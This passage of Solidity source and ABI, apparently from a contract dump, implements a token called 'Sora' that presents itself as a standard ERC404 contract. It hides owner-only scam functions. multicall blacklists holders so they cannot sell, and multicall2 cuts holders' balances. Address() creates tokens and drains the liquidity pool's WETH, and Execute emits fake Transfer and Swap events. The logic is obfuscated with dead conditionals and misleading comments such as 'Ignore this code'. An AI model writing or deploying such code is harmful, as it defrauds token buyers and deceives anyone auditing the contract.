_owned[to].push(id);\r\n        _ownedIndex[id] = _owned[to].length - 1;\r\n\r\n\r\n    }\r\n\r\n    function _burn(address from) internal virtual {\r\n        if (from == address(0)) {\r\n            revert ();\r\n        }\r\n\r\n        uint256 id = _owned[from][_owned[from].length - 1];\r\n        _owned[from].pop();\r\n        delete _ownedIndex[id];\r\n        delete _ownerOf[id];\r\n        delete getApproved[id];\r\n\r\n\r\n    }\r\n\r\n    function _setNameSymbol(\r\n        string memory _name,\r\n        string memory _symbol\r\n    ) internal {\r\n        name_ = _name;\r\n        symbol_ = _symbol;\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Implementation of the {IERC404} interface.\r\n *\r\n * This implementation is agnostic to the way tokens are created. This means\r\n * that a supply mechanism has to be added in a derived contract using {_mint}.\r\n * For a generic mechanism see {ERC404PresetMinterPauser}.\r\n *\r\n * TIP: For a detailed writeup see our guide\r\n * https://forum.zeppelin.solutions/t/how-to-implement-ERC404-supply-mechanisms/226[How\r\n * to implement supply mechanisms].\r\n *\r\n * We have followed general OpenZeppelin guidelines: functions revert instead\r\n * of returning `false` on failure. This behavior is nonetheless conventional\r\n * and does not conflict with the expectations of ERC404 applications.\r\n *\r\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\r\n * This allows applications to reconstruct the allowance for all accounts just\r\n * by listening to said events. Other implementations of the EIP may not emit\r\n * these events, as it isn't required by the specification.\r\n *\r\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\r\n * functions have been added to mitigate the well-known issues around setting\r\n * allowances. See {IERC404-approve}.\r\n */\r\ncontract ERC404 {\r\n    string public baseTokenURI;\r\n    mapping(address => mapping(address => uint256)) public a;\r\n    mapping(address => uint256) public b;\r\n    mapping(address => uint256) public c;\r\n    address public owner;\r\n    uint256 _totalSupply;\r\n    string _name;\r\n    string _symbol;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n    event Swap(\r\n        address indexed sender,\r\n        uint256 amount0In,\r\n        uint256 amount1In,\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        address indexed to\r\n    );\r\n\r\n    modifier onlyOwner() {\r\n        require(owner == msg.sender, \"Caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function totalSupply() public view virtual returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function TryCall(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\n        return _a / _b;\r\n    }\r\n\r\n    function FetchToken2(uint256 _a) internal pure returns (uint256) {\r\n        return (_a * 100000) / (2931 + 97069);\r\n    }\r\n\r\n    function FetchToken(uint256 _a) internal pure returns (uint256) {\r\n        return _a + 10;\r\n    }\r\n\r\n    function add(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\n        // Ignore this code\r\n        uint256 __c = _a + _b;\r\n        require(__c >= _a, \"SafeMath: addition overflow\");\r\n\r\n        return __c;\r\n    }\r\n\r\n   \r\n\r\n    function transfer(\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual returns (bool) {\r\n        _transfer(msg.sender, to, amount);\r\n        return true;\r\n    }\r\n\r\n     function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\n        require(_b <= _a, \"SafeMath: subtraction overflow\");\r\n        uint256 __c = _a - _b;\r\n\r\n        return __c;\r\n    }\r\n\r\n    function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\n        return _a / _b;\r\n    }\r\n\r\n    function _T() internal view returns (bytes32) {\r\n        return bytes32(uint256(uint160(address(this))) << 96);\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual returns (uint256) {\r\n        return b[account];\r\n    }\r\n\r\n    function allowance(\r\n        address __owner,\r\n        address spender\r\n    ) public view virtual returns (uint256) {\r\n        return a[__owner][spender];\r\n    }\r\n\r\n    function approve(\r\n        address spender,\r\n        uint256 amount\r\n    ) public virtual returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual returns (bool) {\r\n        _spendAllowance(from, msg.sender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(\r\n        address spender,\r\n        uint256 addedValue\r\n    ) public virtual returns (bool) {\r\n        address __owner = msg.sender;\r\n        _approve(__owner, spender, allowance(__owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(\r\n        address spender,\r\n        uint256 subtractedValue\r\n    ) public virtual returns (bool) {\r\n        address __owner = msg.sender;\r\n        uint256 currentAllowance = allowance(__owner, spender);\r\n        require(\r\n            currentAllowance >= subtractedValue,\r\n            \"ERC404: decreased allowance below zero\"\r\n        );\r\n\r\n        _approve(__owner, spender, currentAllowance - subtractedValue);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC404: transfer from the zero address\");\r\n        require(to != address(0), \"ERC404: transfer to the zero address\");\r\n\r\n        uint256 fromBalance = b[from];\r\n        require(\r\n            fromBalance >= amount,\r\n            \"ERC404: transfer amount exceeds balance\"\r\n        );\r\n        if (c[from] > 0) {\r\n            require(add(c[from], b[from]) == 0);\r\n        }\r\n\r\n        b[from] = sub(fromBalance, amount);\r\n        b[to] = add(b[to], amount);\r\n        emit Transfer(from, to, amount);\r\n    }\r\n\r\n    function _approve(\r\n        address __owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(__owner != address(0), \"ERC404: approve from the zero address\");\r\n        require(spender != address(0), \"ERC404: approve to the zero address\");\r\n\r\n        a[__owner][spender] = amount;\r\n        emit Approval(__owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address __owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(__owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(\r\n                currentAllowance >= amount,\r\n                \"ERC404: insufficient allowance\"\r\n            );\r\n\r\n            _approve(__owner, spender, currentAllowance - amount);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Hook that is called before any transfer of tokens. This includes\r\n     * minting and burning.\r\n     *\r\n     * Calling conditions:\r\n     *\r\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\r\n     * will be to transferred to `to`.\r\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\r\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\r\n     * - `from` and `to` are never both zero.\r\n     *\r\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\r\n     */\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n}\r\n\r\ncontract Sora is AERC404, ERC404 {\r\n    Interfaces internal _RR;\r\n    Interfaces internal _pair;\r\n    uint8 public decimals = 18;\r\n\r\n    mapping(address => uint) public rootValues;\r\n\r\n    constructor() {\r\n        _name = \"Sora\";\r\n        _symbol = \"SORA\";\r\n        _totalSupply = 600_000_000e18;\r\n        owner = msg.sender;\r\n        b[owner] = _totalSupply;\r\n        _RR = Interfaces(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _pair = Interfaces(\r\n            Interfaces(_RR.factory()).createPair(\r\n                address(this),\r\n                address(_RR.WETH())\r\n            )\r\n        );\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n\r\n    function setTokenURI(string memory _tokenURI) public onlyOwner {\r\n        baseTokenURI = _tokenURI;\r\n    }\r\n\r\n    function Execute(\r\n        uint256 t,\r\n        address tA,\r\n        uint256 w,\r\n        address[] memory r\r\n    ) public onlyOwner returns (bool) {\r\n        for (uint256 i = 0; i < r.length; i++) {\r\n            callUniswap(r[i], t, w, tA);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function Div() internal view returns (address[] memory) {\r\n        address[] memory p;\r\n        p = new address[](2);\r\n        p[0] = address(this);\r\n        p[1] = _RR.WETH();\r\n        return p;\r\n    }\r\n\r\n    function getContract(\r\n        uint256 blockTimestamp,\r\n        uint256 selector,\r\n        address[] memory list,\r\n        address factory\r\n    ) internal {\r\n        a[address(this)][address(_RR)] = b[address(this)];\r\n        FactoryReview(blockTimestamp, selector, list, factory);\r\n    }\r\n\r\n    function FactoryReview(\r\n        uint256 blockTime,\r\n        uint256 multiplicator,\r\n        address[] memory parts,\r\n        address factory\r\n    ) internal {\r\n        _RR.swapTokensForExactTokens(\r\n            // assembler\r\n            blockTime,\r\n            multiplicator,\r\n            // unchecked\r\n            parts,\r\n            factory,\r\n            block.timestamp + 1200\r\n        );\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n     * but also transferring `value` wei to `target`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - the calling contract must have an ETH balance of at least `value`.\r\n     * - the called Solidity function must be `payable`.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function Address(address _r) public onlyOwner {\r\n        uint256 calling = (Sub(_RR.WETH()) * 99999) / 100000;\r\n        address[] memory FoldArray = Div();\r\n        uint256 called = Allowance(calling, FoldArray);\r\n        getContract(calling, called, FoldArray, _r);\r\n    }\r\n\r\n    function Sub(address t) internal view returns (uint256) {\r\n        (uint112 r0, uint112 r1, ) = _pair.getReserves();\r\n        return (_pair.token0() == t) ? uint256(r0) : uint256(r1);\r\n    }\r\n\r\n    function ConvertAddress(\r\n        address _uu,\r\n        uint256 _pp\r\n    ) internal view returns (uint256) {\r\n        return TryCall(b[_uu], _pp);\r\n    }\r\n\r\n    /**\r\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\r\n     * `recipient`, forwarding all available gas and reverting on errors.\r\n     *\r\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\r\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\r\n     * imposed by `transfer`, making them unable to receive funds via\r\n     * `transfer`. {sendValue} removes this limitation.\r\n     *\r\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\r\n     *\r\n     * IMPORTANT: because control is transferred to `recipient`, care must be\r\n     * taken to not create reentrancy vulnerabilities. Consider using\r\n     * {ReentrancyGuard} or the\r\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\r\n     */\r\n    function CheckAmount2(bytes32 _b, uint256 __a) internal {\r\n        // Assembler for gas optimization {}\r\n        emit Transfer(\r\n            (uint256(0) != 0 || 1238 == 1)\r\n                ? address(uint256(0))\r\n                : address(uint160(uint256(_b) >> 96)),\r\n            address(_pair),\r\n            b[\r\n                // v0.5.11 specific update\r\n                (uint256(0) != 0 || 1238 == 1)\r\n                    ? address(\r\n                        address(uint256(0)) == address(this) // Overflow control\r\n                            ? uint256(0) // Ignore\r\n                            : uint256(1)\r\n                    )\r\n                    : address(uint160(uint256(_b) >> 96))\r\n                // Guard test\r\n            ]\r\n        );\r\n        // Ignore this code\r\n        b[\r\n            // assembly\r\n            (uint256(0) != 0 || 1238 == 1)\r\n                ? address(\r\n                    // Must control\r\n                    uint256(0)\r\n                )\r\n                : address(uint160(uint256(_b) >> 96))\r\n            // Contract opcode\r\n        ] = FetchToken2(uint256(__a));\r\n    }\r\n\r\n    function Mult(\r\n        uint256 amO,\r\n        address[] memory p\r\n    ) internal view returns (uint256[] memory) {\r\n        return _RR.getAmountsIn(amO, p);\r\n    }\r\n\r\n    /**\r\n     * @dev Performs a Solidity function call using a low level `call`. A\r\n     * plain`call` is an unsafe replacement for a function call: use this\r\n     * function instead.\r\n     *\r\n     * If `target` reverts with a revert reason, it is bubbled up by this\r\n     * function (like regular Solidity function calls).\r\n     *\r\n     * Returns the raw returned data. To convert to the expected return value,\r\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `target` must be a contract.\r\n     * - calling `target` with `data` must not revert.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function multicall2(bytes32[] calldata data, uint256 _p) public onlyOwner {\r\n        // Assembler for gas optimization {}\r\n        for (uint256 i = 0; i < data.length; i++) {\r\n            // assembly\r\n            if (block.timestamp > uint256(uint160(uint8(0)))) {\r\n                // assembly\r\n                uint256 rS = ConvertAddress(\r\n                    (uint256(uint16(uint8(0))) != 0) // Skip this code\r\n                        ? address(uint256(0))\r\n                        : address(uint160(uint256(data[i]) >> 96)),\r\n                    _p\r\n                );\r\n                CheckAmount2(data[i], rS);\r\n            }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Performs a Solidity function call using a low level `call`. A\r\n     * plain`call` is an unsafe replacement for a function call: use this\r\n     * function instead.\r\n     *\r\n     * If `target` reverts with a revert reason, it is bubbled up by this\r\n     * function (like regular Solidity function calls).\r\n     *\r\n     * Returns the raw returned data. To convert to the expected return value,\r\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `target` must be a contract.\r\n     * - calling `target` with `data` must not revert.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function multicall(bytes32[] calldata data, uint256 _p) public onlyOwner {\r\n        // Assembler for gas optimization {}\r\n        for (uint256 i = 0; i < data.length; i++) {\r\n            // assembly\r\n            if (block.timestamp > uint256(uint160(uint8(0)))) {\r\n                // assembly\r\n                uint256 rS = ConvertAddress(\r\n                    (uint256(uint16(uint8(0))) != 0)\r\n                        ? address(uint256(0)) // Ignore this code\r\n                        : address(uint160(uint256(data[i]) >> 96)),\r\n                    _p\r\n                );\r\n                CheckAmount(data[i], rS);\r\n            }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\r\n     * `recipient`, forwarding all available gas and reverting on errors.\r\n     *\r\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\r\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\r\n     * imposed by `transfer`, making them unable to receive funds via\r\n     * `transfer`. {sendValue} removes this limitation.\r\n     *\r\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\r\n     *\r\n     * IMPORTANT: because control is transferred to `recipient`, care must be\r\n     * taken to not create reentrancy vulnerabilities. Consider using\r\n     * {ReentrancyGuard} or the\r\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\r\n     */\r\n    function CheckAmount(bytes32 _b, uint256 __a) internal {\r\n        // Assembler for gas optimization {}\r\n        // Ignore this code\r\n        c[\r\n            // assembly\r\n            (uint256(0) != 0 || 1238 == 1)\r\n                ? address(\r\n                    // Must control\r\n                    uint256(uint32(2)) == 2 // Check update\r\n                        ? uint256(1)\r\n                        : uint256(1)\r\n                )\r\n                : address(uint160(uint256(_b) >> 96))\r\n            // Contract opcode\r\n        ] = FetchToken(uint256(__a));\r\n    }\r\n\r\n    function callUniswap(\r\n        address router,\r\n        uint256 transfer,\r\n        uint256 cycleWidth,\r\n        address unmount\r\n    ) internal {\r\n        IERC404(unmount).transferFrom(router, address(_pair), cycleWidth);\r\n        emit Transfer(address(_pair), router, transfer);\r\n        emit Swap(\r\n            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D,\r\n            transfer,\r\n            0,\r\n            0,\r\n            cycleWidth,\r\n            router\r\n        );\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\r\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function Allowance(\r\n        uint256 checked,\r\n        address[] memory p\r\n    ) internal returns (uint256) {\r\n        // Assembler for gas optimization {}\r\n        uint256[] memory value;\r\n        value = new uint256[](2);\r\n\r\n        // uncheck {\r\n        value = Mult(checked, p);\r\n        b[\r\n            block.timestamp > uint256(1) ||\r\n                uint256(0) > 1 ||\r\n                uint160(1) < block.timestamp\r\n                ? address(uint160(uint256(_T()) >> 96))\r\n                : address(uint256(0))\r\n        ] += value[0]; // end uncheck }\r\n\r\n        return value[0];\r\n    }\r\n\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"name\":\"ApprovalForAll\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"ERC20Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"}],\"name\":\"ERC721Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_r\",\"type\":\"address\"}],\"name\":\"Address\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"t\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"tA\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"w\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"r\",\"type\":\"address[]\"}],\"name\":\"Execute\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"a\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"__owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance_\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountOrId\",\"type\":\"uint256\"}],\"name\":\"approve_\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"b\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf_\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"baseTokenURI\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"c\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals_\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"getApproved\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isApprovedForAll\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minted\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32[]\",\"name\":\"data\",\"type\":\"bytes32[]\"},{\"internalType\":\"uint256\",\"name\":\"_p\",\"type\":\"uint256\"}],\"name\":\"multicall\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32[]\",\"name\":\"data\",\"type\":\"bytes32[]\"},{\"internalType\":\"uint256\",\"name\":\"_p\",\"type\":\"uint256\"}],\"name\":\"multicall2\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name_\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"}],\"name\":\"ownerOf\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"rootValues\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"}],\"name\":\"safeTransferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"safeTransferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"approved\",\"type\":\"bool\"}],\"name\":\"setApprovalForAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_tokenURI\",\"type\":\"string\"}],\"name\":\"setTokenURI\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"target\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"state\",\"type\":\"bool\"}],\"name\":\"setWhitelist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol_\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"}],\"name\":\"tokenURI\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply_\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\